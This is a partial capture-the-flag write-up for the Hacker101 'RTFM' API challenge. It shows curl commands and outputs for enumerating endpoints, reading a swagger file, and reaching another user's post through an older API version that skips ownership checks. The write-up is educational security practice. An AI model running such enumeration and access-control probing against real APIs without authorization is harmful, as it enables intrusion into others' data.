# Hacker101 RTFM

https://ctf.hacker101.com/ctf

```bash
% export BASE_URL='https://b92382ffe276f612169505245b1a76aa.ctf.hacker101.com'
```

We don't get much for starters:

```bash
% curl ${BASE_URL}
API base located at /api/v1/
% curl ${BASE_URL}/api/v1
["Endpoint not found"]
```

I've been using `dirsearch` (https://github.com/maurosoria/dirsearch) to 
enumerate endpoints:

```bash
% python3 dirsearch.py -u ${BASE_URL}

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, asp, aspx, jsp, html, htm | HTTP method: GET | Threads: 25 | Wordlist size: 12266

Target: https://b92382ffe276f612169505245b1a76aa.ctf.hacker101.com/

[15:15:36] Scanning: 
[15:16:07] 200 -    3KB - /api/v2/swagger.json                              
                                                                             
Task Completed
```

That's something! Off to a good start:

```bash
% curl --silent ${BASE_URL}/api/v2/swagger.json | jq
{
  "swagger": "2.0",
  "flag": "FLAG",
  "info": {
[...]
```

We get a handful of endpoints:

```bash
% curl --silent ${BASE_URL}/api/v2/swagger.json | jq '.paths' | grep '^  "'     
  "/api/v2/user": {
  "/api/v2/user/login": {
  "/api/v2/admin/user-list": {
  "/api/v2/user/posts/{id}": {
```

`/api/v2/user` POST endpoint is unauthenticated - that's promising. So is 
`/api/v2/user/login`, but that requires a username and a password (maybe 
something to look at later).

```bash
% curl -d'username=pizza&password=pizza' ${BASE_URL}/api/v2/user
{"username":"pizza","flag":"FLAG","message":"User created go to \/api\/v2\/user\/login to login"}%
% 
```

Let's start a session as well:

```bash
% curl -d'username=pizza&password=pizza' ${BASE_URL}/api/v2/user/login
{"session":"edf12810e48a2bcf2d039b8d31851622"}%
```

Let's check out some endpoints:

```bash
% curl -H 'X-Session: edf12810e48a2bcf2d039b8d31851622' ${BASE_URL}/api/v2/user           
{"username":"pizza"}
% 
% curl -H 'X-Session: edf12810e48a2bcf2d039b8d31851622' ${BASE_URL}/api/v2/admin/user-list
{"error":"Your user level needs to be an admin"}
% 
% curl -H 'X-Session: edf12810e48a2bcf2d039b8d31851622' ${BASE_URL}/api/v2/user/posts/1
{"error":"Post does not belong to you"}
% 
% curl -H 'X-Session: edf12810e48a2bcf2d039b8d31851622' ${BASE_URL}/api/v2/user/posts/2
{"error":"Post does not exist"}
```

Not much. What about those `/api/v1` endpoints the home page mentioned?

```bash
% curl ${BASE_URL}/api/v1/swagger.json                                  
["Endpoint not found"]
%
curl ${BASE_URL}/api/v1/login
["Endpoint not found"]
%
% curl -d'username=pizza&password=pizza' ${BASE_URL}/api/v1/user/login
{"token":"a15bb21c251d356c1b77c0064bc58859"}
%
% curl -H 'X-Token: a15bb21c251d356c1b77c0064bc58859' ${BASE_URL}/api/v1/admin/user-list
["Endpoint not found"]
%
% curl -H 'X-Token: a15bb21c251d356c1b77c0064bc58859' ${BASE_URL}/api/v1/admin/user-list
["Endpoint not found"]
%
% curl -H 'X-Token: a15bb21c251d356c1b77c0064bc58859' ${BASE_URL}/api/v1/user/posts/1
{"id":1,"post":"You got the Post: FLAG","analytics":"\/api\/v1\/post-analytics\/3c8a6664b8203c2e0b2b24972ccf5ce3"}
% 
```

Alright! A flag, and a bonus endpoint to boot. Anything there?

```bash
% curl -H 'X-Token: a15bb21c251d356c1b77c0064bc58859' ${BASE_URL}/api/v1/post-analytics/3c8a6664b8203c2e0b2b24972ccf5ce3
{"hash":"3c8a6664b8203c2e0b2b24972ccf5ce3","post":1,"views":34373}
%
% curl -H 'X-Token: a15bb21c251d356c1b77c0064bc58859' ${BASE_URL}/api/v1/post-analytics/
{"campaigns":["3c8a6664b8203c2e0b2b24972ccf5ce3"]}
%
% curl -H 'X-Token: a15bb21c251d356c1b77c0064bc58859' ${BASE_URL}/api/v1/campaigns
["Endpoint not found"]
%
% curl -H 'X-Token: a15bb21c251d356c1b77c0064bc58859' ${BASE_URL}/api/v1/campaigns/
["Endpoint not found"]
%
% curl -H 'X-Token: a15bb21c251d356c1b77c0064bc58859' ${BASE_URL}/api/v1/campaigns/3c8a6664b8203c2e0b2b24972ccf5ce3
["Endpoint not found"]
%
```

Maybe worth exploring. Possibly something we can explore in the v2 API as well?

